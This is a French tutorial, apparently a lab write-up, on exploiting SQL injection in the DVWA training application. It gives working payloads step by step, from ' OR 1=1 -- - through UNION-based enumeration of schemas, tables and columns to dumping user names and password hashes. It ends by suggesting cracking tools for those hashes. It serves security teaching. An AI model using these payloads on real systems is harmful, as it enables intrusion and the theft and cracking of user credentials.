# CLASSIQUE SQL INJECTION - EXPLOIT

## 1. Présentation

#### Dans ce Tuto, nous allons voir comment exploiter une vulnérabilité de type "injection SQL".

<p>Le site en question présente de nombreuses vulnérabilités. Il constitue un laboratoire d'exploitation et de tests de vulnérabilité. </p>
<p>La vulnérabilité que allons nous décrire dans les lignes qui suivent est le "SQL injection". <i>Pour plus d'infos : <a href="https://www.kaspersky.fr/resource-center/definitions/sql-injection" target="_blank">Cliquez ici</a></i></p>
<p>Les technos utilisées dans ce site sont  :</p>
 <img src="captures/techno_site.png"/>

<p>Description de l'interaction avec le visiteur du site</p>
<ol>
    <li>On demande au visiteur d'entrer un id (user id)</li>
    <li>Le serveur retourne ensuite le "First name" et le "Surname" de l'id correspondant.</li>
</ol>

<img src="captures/gordon_screen.png"/>

## 2. Etude du comportement 

<p>2.1 Essayons de voir comment le site se comporte quand on entre des valeurs auxquelles il s'attend pas</p>
<div style="display:flex; flex-direction:row; justify-content: center; align-items: start;">
    <div>
        <p>On entre une chaine de caractères avec des quotes au lieu d'un entier</p>
        <img src="captures/coucou.png"/>
    </div>
    <div>
        <p>Le serveur traite bien la requête et retourne un code 200 pour dire que tout se passe bien. Ce qui est anormal.</p>
        <img src="captures/coucou_response.png"/>
    </div>
</div>

<p>2.2 Essayons de voir si le sql injection passe.</p>
<p>Pour cela nous allons deviner (grâce aux technos utilisées dans ce site) la requête SQL qui est faite pour récupérer les infos affichées.</p>
<p> Après plusieurs tests, nous déduisons que la requête en question pourrait ressembler à ceci : </p>

```SQL
    SELECT colonne1, colonne2
    FROM nom_de_la_table 
    WHERE id = '$id';
```
<p>Le champ <i>id</i> est notre input qui a été envoyé au serveur. C'est ce champ que nous allons utiliser pour changer la requête SQL.</p>

Pour ce faire, nous allons mettre une chaine de caractères qui va nous renvoyer toutes les lignes.
La chaîne en question est la suivante : 
`` ' OR 1=1 -- - ``
<p> De ce fait, la requête sera : </p>

```SQL
    SELECT colonne1, colonne2
    FROM nom_de_la_table
    WHERE id = '' OR 1=1 -- - ' ;
```

<p> Cette requête retournera les lignes de la table concernée car la condition 

`` WHERE id='' OR 1=1 `` 
est toujours vraie. Les caractères "<span style="color:#FF5733">-- -</span>" servent à commenter le reste de la requête qui ne sera pas exécuté.</p>

<img src="captures/exploit1.png"/>
 <p>Le SQL injection passe et on arrive à afficher les infos de la table .</p>


## 3. Extraire plus d'informations

<p>Nous sommes sûrs que le site est vulnérable au 'SQL injection'.</p>
<Utilisons>Essayons maintenant de recueillir plus d'informations. </p>

#### 3.1 Version de la BD

<p>En faisant quelques tests, nous savons qu'il y a deux colonnes qui sont sollicitées dans la requête.</p>
<p>De ce fait notre input prendra cette valeur : 

''`` ' UNION SELECT NULL,version()-- - ``''
</p>


La requête ressemblera à ceci : 
```SQL
    SELECT colonne1, colonne2
    FROM nom_de_la_table
    WHERE  id = '' UNION SELECT NULL,version()-- - '
```
<p>
<i> 

 `` version() `` ou `` @@version``</i> est une variable système qu'on retrouve dans la plupart des BD SQL.</p>

<img src="captures/version.png" />
<p>L'image ci-dessus nous montre qu'il s'agit d'une BD mariaDB.</p>

#### 3.2 Nom des bases de données (schemas)

<p>Notre input ici prendra la valeur suivante : </p>

"``' UNION SELECT concat(schema_name),1 from information_schema.schemata -- - ``"

<i> 

``schema_name ``</i> est aussi une variable système. Donc les schémas seront affichées dans la première colonne et la valeur 1 dans la deuxième</p>
<p>Nous voyons avec la capture ci-dessous que nous avons 2 BD : <b> 'dvwa' </b> et <b>information_schema</b></p>

La BD qui nous intéressera est dvwa

<img src="captures/schema.png" />

#### 3.3 Extraire les tables de la BD dvwa

input  :  <span style = "color : #FF5733 ">
``' UNION SELECT concat(TABLE_NAME),1 from information_schema.TABLES WHERE table_schema='dvwa' -- -``
</span>

<p> <i>TABLE_NAME</i> est aussi une variable système</p>
<p> Nous constatons que la BD dvwa contient deux tables : users et guestbook</p>

<img src ="captures/tables.png" />

#### 3.4 Extraire les colonnes de la table users

input  :  <span style = "color : #FF5733 ">
``' UNION SELECT concat(COLUMN_NAME),1 from information_schema.COLUMNS WHERE TABLE_NAME='users' -- -``
</span>

<p> <i>COLUMN_NAME</i> est aussi une variable système</p>
<p> Les colonnes de la table users sont : </p>
<ul>
<li>user_id</li>
<li>first_name</li>
<li>last_name</li>
<li>user</li>
<li>password</li>
<li>avatar</li>
<li>last_login</li>
<li>failed_login</li>
</ul>

<img src="captures/columns.png" />

#### 3.5 Extraire tous les noms et les mots de passe

input  :  <span style = "color : #FF5733 ">
``'  UNION SELECT concat(0x28,first_name,0x3a,last_name,0x3a,password,0x29),1 from users -- -``
</span>

<p>Nous utilisons la fonction <i>concat()</i>  pour mettre en forme et afficher autant d'informations qu'on veut. </p>
<p>Les caratères <span style="color: #2391C8"> 0x28 0x3a 0x29 </span> sont respectivement les représentations acsii  de <span style="color: #2391C8;"> <i>(</i> </span>, <span style="color: #2391C8;"> <i>:</i> </span>  et <span style="color: #2391C8;"> <i>)</i> </span> converties en hexadécimale. Ils sont utilisés pour la mise en forme</p>

<p>L'image ci-dessous nous montre les différents infos récupérées.</p>
<img src="captures/lines.png" />

## 4. Casser les mots de passe

<p>Nous remarquons que les mots de passe sont hashés. Le hash utilisé ressemble à du MD5 (32 caractères).</p>
<p> Pour casser les mots de passe, utilisons <a href="https://www.openwall.com/john/">John the Ripper</a> ou un crackeur de mot de passe en ligne : <a href="https://md5decrypt.net/">MD5 decrypt</a></p>

<img src="captures/decrypt_password.png" />

Les mots de passe en clair sont visibles sur l'image ci-dessus.
